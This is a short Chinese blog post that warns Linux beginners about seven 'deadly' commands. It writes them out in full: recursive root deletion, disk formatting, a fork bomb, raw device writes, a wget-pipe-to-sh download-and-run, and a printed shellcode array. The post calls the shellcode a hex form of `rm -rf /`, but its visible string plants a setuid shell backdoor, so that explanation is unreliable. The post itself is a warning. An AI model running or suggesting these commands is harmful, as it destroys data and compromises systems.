Title: 7 个致命的 Linux 命令
Date: 2008-11-21 10:04
Author: toy
Category: Cli
Tags: Commands
Slug: the-7-deadly-linux-commands

如果你是一个 Linux
新手，在好奇心的驱使下，可能会去尝试从各个渠道获得的命令。以下是 7
个致命的 Linux
命令，轻则使你的数据造成丢失，重则使你的系统造成瘫痪，所以，你应当竭力避免在系统中运行它们。

1.  `rm -rf /`
    此命令将递归并强制删除 / 目录下的所有文件。
2.  char esp[] __attribute__ ((section(".text"))) /* e.s.p
        release */
        = "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
        "\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
        "\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
        "\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
        "\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
        "\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
        "\x6e\x2f\x73\x68\x00\x2d\x63\x00"
        "cp -p /bin/sh /tmp/.beyond; chmod 4755
        /tmp/.beyond;";

    这是 rm -rf / 的 hex（十六进制）版本，很能迷惑 Linux 用户。

3.  `mkfs.ext3 /dev/sda`
    这将对硬盘进行重新格式化，自然，硬盘上的所有数据将灰飞烟灭。
4.  `:(){ :|:& };:`
    著名的 fork
    炸弹，此命令将告诉你的系统执行海量的进程，直到你的系统僵死。
5.  `any_command > /dev/sda`
    使用该命令，原始数据将被写到块设备，其结果是造成数据丢失。
6.  `wget http://some_untrusted_source -O- | sh`
    不要从不信任的地方下载东西，这可能会获取恶意代码。
7.  `mv /home/yourhomedirectory/* /dev/null`
    此命令将移动主目录中的所有文件到一个不存在的地方，你将再也看不到那些文件。

如果你认为还有其他致命的 Linux 命令，那么请在留言中告诉我们。

[via [TECH SOURCE FROM
BOHOL](http://www.junauza.com/2008/11/7-deadly-linux-commands.html)]
